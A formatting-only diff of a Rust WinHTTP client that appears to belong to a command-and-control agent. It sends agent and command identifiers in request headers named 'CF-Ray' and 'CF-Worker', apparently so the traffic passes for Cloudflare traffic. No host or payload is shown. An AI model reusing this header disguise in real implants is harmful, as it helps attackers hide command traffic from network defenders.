@@ -1,17 +1,20 @@
+use alloc::{format, sync::Arc, vec::Vec};
 use core::{
     ffi::c_void,
     ptr::{null, null_mut},
     sync::atomic::{AtomicPtr, Ordering},
 };
 
-use alloc::{format, sync::Arc, vec::Vec};
 use anyhow::Result;
 use bytes::{BufMut, Bytes, BytesMut};
 use mod_agentcore::ldr::nt_get_last_error;
 use mod_win32::nt_winhttp::get_winhttp;
 use rs2_communication_protocol::metadata::Metadata;
 use rs2_win32::winhttp::{
-    WinHttpError, HTTP_QUERY_STATUS_CODE, WINHTTP_FLAG_BYPASS_PROXY_CACHE, WINHTTP_FLAG_SECURE,
+    WinHttpError,
+    HTTP_QUERY_STATUS_CODE,
+    WINHTTP_FLAG_BYPASS_PROXY_CACHE,
+    WINHTTP_FLAG_SECURE,
     WINHTTP_QUERY_FLAG_NUMBER,
 };
 
@@ -46,13 +49,7 @@ impl WinHttpClient {
     fn init_session(&self, user_agent: &str) {
         if self.session_handle.load(Ordering::Acquire).is_null() {
             unsafe {
-                let h_session = (get_winhttp().win_http_open)(
-                    to_pcwstr(user_agent).as_ptr(),
-                    0,
-                    null(),
-                    null(),
-                    0,
-                );
+                let h_session = (get_winhttp().win_http_open)(to_pcwstr(user_agent).as_ptr(), 0, null(), null(), 0);
                 self.session_handle.store(h_session, Ordering::Release);
             }
         }
@@ -190,22 +187,12 @@ impl WinHttpClient {
             // Add CF-Ray header
             let cf_ray_header = format!("{}.{}", metadata.request_id, metadata.agent_id);
             let cf_ray_header_str = to_pcwstr(&format!("CF-Ray: {}", cf_ray_header));
-            (get_winhttp().win_http_add_request_headers)(
-                h_request,
-                cf_ray_header_str.as_ptr(),
-                -1,
-                0,
-            );
+            (get_winhttp().win_http_add_request_headers)(h_request, cf_ray_header_str.as_ptr(), -1, 0);
 
             // Add CF-Worker header
             let cf_worker_header = metadata.command_id.clone();
             let cf_worker_header_str = to_pcwstr(&format!("CF-Worker: {}", cf_worker_header));
-            (get_winhttp().win_http_add_request_headers)(
-                h_request,
-                cf_worker_header_str.as_ptr(),
-                -1,
-                0,
-            );
+            (get_winhttp().win_http_add_request_headers)(h_request, cf_worker_header_str.as_ptr(), -1, 0);
 
             // Send the POST request with the body data.
             let b_request_sent = (get_winhttp().win_http_send_request)(
@@ -227,8 +214,7 @@ impl WinHttpClient {
             }
 
             // Receive the response to the POST request.
-            let b_response_received =
-                (get_winhttp().win_http_receive_response)(h_request, null_mut());
+            let b_response_received = (get_winhttp().win_http_receive_response)(h_request, null_mut());
             if b_response_received == 0 {
                 let error = nt_get_last_error();
                 (get_winhttp().win_http_close_handle)(h_request);
